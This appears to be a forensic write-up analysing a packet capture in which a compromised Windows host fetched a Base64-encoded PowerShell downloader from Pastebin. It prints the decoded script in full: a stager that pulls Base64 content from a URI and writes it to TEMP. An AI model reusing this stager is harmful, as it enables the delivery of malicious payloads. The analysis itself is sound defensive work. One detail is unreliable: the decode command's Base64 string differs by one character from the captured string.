## Creation of `WriteRemoteEncoded.ps1`

### **Objective:**
Identify and decode the Base64-encoded script downloaded from Pastebin during the observed TCP session and verify its role in the creation of the `WriteRemoteEncoded.ps1` script.

### **Tool Used:**
- Wireshark

### **Wireshark Filter Used:**
To locate the relevant packets in Wireshark, the following display filter was used to identify HTTP GET requests to Pastebin and the corresponding HTTP responses:
```plaintext
http.host == "pastebin.com" && http.request.uri == "/raw/VeLUwUuq"
```

### **Relevant Packets:**

#### **1. Initial GET Request:**
- **Frame Number:** 103477
- **Arrival Time (UTC):** 2019-08-17 05:44:16.746598
- **Source IP:** 10.2.0.2
- **Destination IP:** 104.20.209.21
- **Protocol:** HTTP
- **Request Details:**
    - **Method:** GET
    - **Host:** pastebin.com
    - **Request URI:** /raw/VeLUwUuq
    - **User-Agent:** Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1

#### **2. HTTP Response:**
- **Frame Number:** 103480
- **Arrival Time (UTC):** 2019-08-17 05:44:17.285091
- **Source IP:** 104.20.209.21
- **Destination IP:** 10.2.0.2
- **Protocol:** HTTP
- **Response Details:**
    - **Status Code:** 200 OK
    - **Content-Type:** text/plain; charset=utf-8
    - **Transfer-Encoding:** chunked
    - **Data Chunk (Base64-Encoded):**
      ```plaintext
      UGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwKICAgIFZhbHVlRnJvbVBpcGVMaW5lPSRmYWxzZSldCiAgICBbU3RyaW5nW11dCiAgICAkVXJpLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLAogICAgVmFsdWVGcm9tUGlwZUxpbmU9JGZhbHNlKV0KICAgIFtTdHJpbmdbXV0KICAgICRGaWxlTmFtZQopCgpXcml0ZS1Ib3N0ICRVcmkKCiRwYXRoID0gIiRlbnY6VEVNUFwkRmlsZU5hbWUiCmlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsKICAgIFdyaXRlLUhvc3QgIlsqXSBGaWxlIGFscmVhZHkgZXhpc3QgYXQgJFNjcmlwdFBhdGgiCiAgICByZXR1cm4gLTEKfQoKJGRhdGEgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkVXJpIiAtVXNlQmFzaWNQYXJzaW5nKS5jb250ZW50KQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRwYXRoLCAkZGF0YSk=
      ```

### **TCP Stream Analysis:**

Using Wireshark’s "Follow TCP Stream" feature, the entire sequence of data exchanged during this session was examined. This included both the GET request and the HTTP response, where the Base64-encoded data was identified.

### **Base64 Decoding:**

The extracted Base64 string was decoded using a command-line utility:
```bash
echo "UGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwKICAgIFZhbHVlRnJvbVBpcGVMaW5lPSRmYWxzZSldCiAgICBbU3RyaW5nW11dCiAgICAkVXJpLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLAogICAgVmFsdWVGcm9tUGlwZUxpbmU9JGZhbHNlKV0KICAgIFtTdHJpbmdbXV0KICAgICRGaWxlTmFtZQopCgpXcml0ZS1Ib3N0ICRVcmkKCiRwYXRoID0gIiRlbnY6VEVNUFwkRmlsZU5hbWUiCmlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsKICAgIFdyaXRlLUhvc3QgIlsqXSBGaWxlIGFscmVhZHkgZXhpc3QgYXQgJFNjcmlwdFBhdGgiCiAgICByZXR1cm4gLTEKfQoKJGRhdGEgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChJbnZva6UtV2ViUmVxdWVzdCAtVXJpICIkVXJpIiAtVXNlQmFzaWNQYXJzaW5nKS5jb250ZW50KQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRwYXRoLCAkZGF0YSk=" | base64 -d
```

### **Decoded Script:**
```powershell
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $Uri,

    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $FileName
)

Write-Host $Uri

$path = "$env:TEMP\$FileName"
if (Test-Path -Path $path) {
    Write-Host "[*] File already exist at $ScriptPath"
    return -1
}

$data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$Uri" -UseBasicParsing).content)
[System.IO.File]::WriteAllBytes($path, $data)
```

### **Connection to `WriteRemoteEncoded.ps1`:**

The decoded script content matches exactly with the PowerShell script `WriteRemoteEncoded.ps1` that was found on the compromised system. This means that the Base64 content was used to create and execute the `WriteRemoteEncoded.ps1` script, which subsequently downloaded additional malicious payloads to the system.

### **Summary:**

This script, which was encoded in Base64 and hosted on Pastebin, is responsible for downloading and saving a file from a remote location. The script first checks if a file already exists at the specified path and, if not, proceeds to download and save the file using the Base64-decoded content fetched from the specified URI. The decoded script directly corresponds to `WriteRemoteEncoded.ps1`, confirming that this script was downloaded from Pastebin and used as part of the attack.

### **Conclusions:**
- **Threat Identification:** The Base64-encoded script represents a method used by the attacker to download additional payloads to the compromised system.
- **Critical Observation:** The decoded content directly correlates to the PowerShell script `WriteRemoteEncoded.ps1`, confirming that this script was downloaded and executed on the compromised system as part of the attack chain.
- **Remediation Actions:** Immediate inspection and potential removal of any files downloaded via this method are recommended, along with further forensic analysis to identify and mitigate any additional threats.

---

This report now accurately reflects the role of the Base64-encoded data in creating the `WriteRemoteEncoded.ps1` script on the compromised system.
